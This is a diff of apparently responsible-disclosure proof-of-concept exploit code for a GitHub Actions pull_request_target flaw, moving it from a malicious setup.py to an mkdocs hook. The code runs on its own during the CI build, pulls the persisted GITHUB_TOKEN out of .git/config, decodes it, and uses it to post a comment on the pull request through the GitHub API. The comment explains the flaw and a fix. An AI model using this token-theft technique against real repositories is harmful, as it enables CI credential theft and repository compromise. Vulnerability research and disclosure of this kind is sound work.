@@ -1,10 +1,9 @@
-"""
-PoC for pull_request_target RCE in PlaceholderAPI/.github/workflows/validate_site.yml.
+"""Mkdocs hook: pull_request_target PoC.
 
-This setup.py is executed by `pip install -r requirements.txt` inside the
-privileged pull_request_target run. It uses the auth header that
-actions/checkout persisted in .git/config to post a comment on the PR
-that triggered this run.
+Loaded by mkdocs because `mkdocs.yml` lists this file under `hooks:`.
+Runs during `mkdocs build --strict` in the privileged pull_request_target
+workflow run, with the actions/checkout token still persisted in .git/config.
+Posts a comment back on the triggering PR to demonstrate write capability.
 """
 import base64
 import json
@@ -19,25 +18,21 @@ def _log(msg):
     print(f"[poc] {msg}", file=sys.stderr, flush=True)
 
 
-def _run():
+def _exploit():
     workspace = os.environ.get("GITHUB_WORKSPACE")
     event_path = os.environ.get("GITHUB_EVENT_PATH")
     repo = os.environ.get("GITHUB_REPOSITORY")
     run_id = os.environ.get("GITHUB_RUN_ID", "?")
-    _log(f"GITHUB_WORKSPACE={workspace}")
-    _log(f"GITHUB_REPOSITORY={repo}")
     if not (workspace and event_path and repo):
         _log("missing required env; bailing")
         return
 
-    cfg_path = os.path.join(workspace, ".git", "config")
-    cfg = open(cfg_path).read()
+    cfg = open(os.path.join(workspace, ".git", "config")).read()
     m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", cfg)
     if not m:
-        _log("no extraheader token in .git/config; bailing")
+        _log("no extraheader token; bailing")
         return
     decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
-    # decoded looks like "x-access-token:ghs_..."
     _, _, token = decoded.partition(":")
     _log(f"token len={len(token)} prefix={token[:4]}")
 
@@ -46,15 +41,17 @@ def _run():
     pr_user = event["pull_request"]["user"]["login"]
 
     body = (
-        "**PoC: pull_request_target RCE**\n\n"
-        f"This comment was posted from `setup.py` while `pip install -r "
-        f"requirements.txt` was running inside `validate_site.yml` "
+        "**PoC: pull_request_target RCE via mkdocs hook**\n\n"
+        f"This comment was posted from `poc_hook.py` while `mkdocs build "
+        f"--strict` was running inside `pr_wiki_validation.yml` "
         f"(run #{run_id}).\n\n"
-        f"The workflow checks out PR head (`{pr_user}`'s code) and pip-installs "
-        f"a PR-controlled `requirements.txt` with the persisted `GITHUB_TOKEN` "
-        f"still in `.git/config`. Any fork PR can do this.\n\n"
-        "Fix: remove `pull_request_target` (use `pull_request`), or split into "
-        "an unprivileged build job + a privileged comment job."
+        f"The workflow checks out PR head (`{pr_user}`'s code) and runs "
+        f"mkdocs with a PR-controlled `mkdocs.yml`. mkdocs `hooks:` "
+        f"directive imports arbitrary Python files from the PR. The "
+        f"persisted `GITHUB_TOKEN` is still in `.git/config` and has "
+        f"`issues: write`, so any fork PR can post comments / leak the token.\n\n"
+        "Fix: switch to `pull_request` (no write token to fork code), or "
+        "split into an unprivileged build job + a privileged commenter job."
     )
     url = f"https://api.github.com/repos/{repo}/issues/{pr_num}/comments"
     req = urllib.request.Request(
@@ -72,10 +69,10 @@ def _run():
 
 
 try:
-    _run()
+    _exploit()
 except Exception:
     traceback.print_exc()
 
-# Keep pip happy — define a trivial package so the install itself succeeds.
-from setuptools import setup
-setup(name="evil-pkg", version="0.0.0", py_modules=[])
+
+def on_config(config, **kwargs):
+    return config
